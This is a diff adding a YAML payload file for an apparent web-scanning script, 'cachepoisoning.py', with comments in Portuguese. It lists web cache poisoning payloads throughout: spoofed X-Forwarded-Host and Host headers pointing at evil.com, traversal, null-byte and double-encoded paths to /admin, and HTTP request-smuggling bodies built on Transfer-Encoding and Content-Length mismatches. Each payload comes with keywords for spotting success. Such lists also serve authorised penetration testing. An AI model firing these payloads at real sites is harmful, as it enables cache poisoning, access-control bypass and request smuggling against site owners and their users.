@@ -1,0 +1,195 @@
+# Cache Poisoning Payloads
+# Usado por cachepoisoning.py
+# Última atualização: 2026-07-17
+
+category_map:
+  host:
+    - xfwd_host
+    - xorig_host
+    - xrewrite_host
+    - xhost_bypass
+    - host_mismatch
+  path:
+    - xorig_url
+    - xrewrite_url
+    - url_path_poison
+    - path_confusion
+    - double_path
+  header:
+    - vary_poison
+    - cache_control_bypass
+    - pragma_bypass
+    - x_cache_test
+    - if_modified
+  encoding:
+    - clte_bypass
+    - te_chunked
+    - content_length_mismatch
+    - transfer_encoding
+    - identity_poison
+  bypass:
+    - double_encode
+    - null_byte
+    - case_variation
+    - unicode_path
+    - backslash_path
+
+host_payloads:
+  - - xfwd_host
+    - X-Forwarded-Host: evil.com
+    - - evil.com
+      - X-Forwarded-Host
+      - cache
+  - - xorig_host
+    - X-Original-URL: https://evil.com/admin
+    - - evil.com
+      - admin
+      - X-Original-URL
+  - - xrewrite_host
+    - X-Rewrite-URL: /admin
+    - - admin
+      - X-Rewrite-URL
+      - rewrite
+  - - xhost_bypass
+    - X-Host: evil.com
+    - - evil.com
+      - X-Host
+      - cache
+  - - host_mismatch
+    - Host: evil.com
+    - - evil.com
+      - Host
+      - mismatch
+
+path_payloads:
+  - - xorig_url
+    - /../../../admin
+    - - admin
+      - redirect
+      - location
+      - path
+  - - xrewrite_url
+    - /admin%00.jpg
+    - - admin
+      - null
+      - path
+  - - url_path_poison
+    - /%2f/%2fadmin
+    - - admin
+      - double
+      - path
+  - - path_confusion
+    - /admin;/
+    - - admin
+      - semicolon
+      - path
+  - - double_path
+    - /admin//index.html
+    - - admin
+      - double
+      - path
+
+header_payloads:
+  - - vary_poison
+    - Vary: X-Forwarded-Host
+    - - Vary
+      - cache
+      - poison
+  - - cache_control_bypass
+    - Cache-Control: "no-cache, max-age=0"
+    - - Cache-Control
+      - no-cache
+      - bypass
+  - - pragma_bypass
+    - Pragma: no-cache
+    - - Pragma
+      - no-cache
+      - cache
+  - - x_cache_test
+    - X-Cache-Status: HIT
+    - - X-Cache
+      - HIT
+      - poison
+  - - if_modified
+    - If-None-Match: "*"
+    - - ETag
+      - 304
+      - modified
+
+encoding_payloads:
+  - - clte_bypass
+    - Transfer-Encoding: chunked
+    - "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n"
+    - - Transfer-Encoding
+      - clte
+      - chunked
+  - - te_chunked
+    - Transfer-Encoding: "identity, chunked"
+    - "0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n"
+    - - Transfer-Encoding
+      - identity
+      - chunked
+  - - content_length_mismatch
+    - Content-Length: "6"
+    - "GET /admin HTTP/1.1\r\n\r\n"
+    - - Content-Length
+      - mismatch
+      - admin
+  - - transfer_encoding
+    - Transfer-Encoding: "gzip, chunked"
+    - "0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n"
+    - - Transfer-Encoding
+      - gzip
+      - chunked
+  - - identity_poison
+    - Transfer-Encoding: identity
+    - "GET /admin HTTP/1.1\r\n\r\n"
+    - - Transfer-Encoding
+      - identity
+      - admin
+
+bypass_payloads:
+  - - double_encode
+    - "%252fadmin%252f"
+    - - admin
+      - double
+      - encode
+      - bypass
+  - - null_byte
+    - /admin%00.html
+    - - admin
+      - null
+      - bypass
+  - - case_variation
+    - /Admin/INDEX.HTML
+    - - Admin
+      - INDEX
+      - case
+      - bypass
+  - - unicode_path
+    - /%E0%80%80admin
+    - - admin
+      - unicode
+      - bypass
+  - - backslash_path
+    - "/\\admin"
+    - - admin
+      - backslash
+      - bypass
+
+ssi_params:
+  - data
+  - json
+  - payload
+  - input
+  - value
+  - content
+  - body
+  - params
+  - query
+  - config
+  - options
+  - settings
+  - item
+  - object
+  - model
